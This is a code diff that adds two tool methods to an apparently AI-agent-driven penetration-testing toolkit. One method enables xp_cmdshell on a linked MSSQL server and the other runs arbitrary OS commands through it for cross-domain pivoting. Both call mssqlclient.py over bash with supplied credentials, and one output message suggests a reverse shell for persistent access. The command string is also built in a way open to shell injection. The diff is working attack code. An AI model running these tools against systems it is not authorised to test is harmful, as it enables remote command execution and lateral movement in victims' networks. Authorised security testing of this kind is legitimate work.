@@ -1184,3 +1184,151 @@ EXEC sp_linkedservers;
 
         except Exception as e:
             return f"MSSQL NTLM coercion failed: {e}"
+
+    @dn.tool_method
+    def mssql_linked_enable_xpcmdshell(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        linked_server: str,
+        domain: str | None = None,
+        windows_auth: bool = True,
+    ) -> str:
+        """
+        Enable xp_cmdshell on a linked MSSQL server for command execution.
+
+        Requires sysadmin privileges on the linked server (often mapped as 'sa').
+        After enabling, use mssql_linked_xpcmdshell to execute system commands.
+
+        This is a HIGH-VALUE attack for cross-domain pivoting when the linked
+        server is in a different domain or forest.
+
+        Args:
+            target: Local MSSQL server IP (where you have access)
+            username: Username for local authentication
+            password: Password for authentication
+            linked_server: Name of the linked server to enable xp_cmdshell on
+            domain: Domain for Windows auth (optional)
+            windows_auth: Use Windows authentication (default: True)
+
+        Returns:
+            xp_cmdshell enablement result on the linked server
+
+        Example:
+            >>> mssql_linked_enable_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "domain.local")
+        """
+        if domain:
+            target_string = f"{domain}/{username}:{password}@{target}"
+        else:
+            target_string = f"{username}:{password}@{target}"
+
+        # nosec B608 - intentional SQL for MSSQL pentest
+        # Enable show advanced options and xp_cmdshell on the linked server
+        enable_queries = [
+            f"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{linked_server}]",
+            f"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}]",
+        ]
+
+        results = []
+        for sql_query in enable_queries:
+            cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
+            if windows_auth:
+                cmd_string += " -windows-auth"
+
+            try:
+                stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
+                results.append(stdout + "\n" + (stderr or ""))
+            except Exception as e:
+                results.append(f"Error: {e}")
+
+        combined_result = "\n".join(results)
+
+        if (
+            "configuration option" in combined_result.lower()
+            or "changed" in combined_result.lower()
+        ):
+            logger.warning(f"[+] xp_cmdshell enabled on linked server {linked_server}!")
+            return (
+                f"✅ xp_cmdshell ENABLED on linked server {linked_server}!\n"
+                f"→ Use mssql_linked_xpcmdshell to execute OS commands\n"
+                f"→ This enables cross-domain pivoting if linked server is in another domain\n\n"
+                + combined_result
+            )
+
+        return (
+            f"📋 xp_cmdshell enable attempt on {linked_server}\n"
+            f"→ Check output for errors (may need sysadmin on linked server)\n\n" + combined_result
+        )
+
+    @dn.tool_method
+    def mssql_linked_xpcmdshell(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        linked_server: str,
+        command: str,
+        domain: str | None = None,
+        windows_auth: bool = True,
+    ) -> str:
+        """
+        Execute OS command via xp_cmdshell on a linked MSSQL server.
+
+        xp_cmdshell must be enabled first (use mssql_linked_enable_xpcmdshell).
+        This is a HIGH-VALUE attack for cross-domain pivoting.
+
+        Args:
+            target: Local MSSQL server IP (where you have access)
+            username: Username for local authentication
+            password: Password for authentication
+            linked_server: Name of the linked server to execute on
+            command: OS command to execute on the linked server
+            domain: Domain for Windows auth (optional)
+            windows_auth: Use Windows authentication (default: True)
+
+        Returns:
+            Command output from the linked server
+
+        Example:
+            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "whoami", "domain.local")
+            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "hostname && ipconfig", "domain.local")
+        """
+        if domain:
+            target_string = f"{domain}/{username}:{password}@{target}"
+        else:
+            target_string = f"{username}:{password}@{target}"
+
+        # Escape single quotes in command for SQL
+        escaped_command = command.replace("'", "''")
+
+        # nosec B608 - intentional SQL for MSSQL pentest
+        sql_query = f"EXEC ('xp_cmdshell ''{escaped_command}''') AT [{linked_server}]"
+
+        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
+        if windows_auth:
+            cmd_string += " -windows-auth"
+
+        try:
+            logger.info(f"[*] Executing command on linked server {linked_server}: {command}")
+            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Check for successful execution indicators
+            if "nt authority" in result.lower() or "nt service" in result.lower():
+                logger.warning(f"[+] Command execution successful on {linked_server}!")
+                return (
+                    f"🚨 COMMAND EXECUTION ON LINKED SERVER {linked_server}!\n"
+                    f"→ Command: {command}\n"
+                    f"→ Check for domain information to identify pivot opportunities\n"
+                    f"→ Consider reverse shell for persistent access\n\n" + result
+                )
+
+            return (
+                f"📋 Command execution attempted on {linked_server}\n"
+                f"→ Command: {command}\n\n" + result
+            )
+
+        except Exception as e:
+            return f"Linked server xp_cmdshell execution failed: {e}"
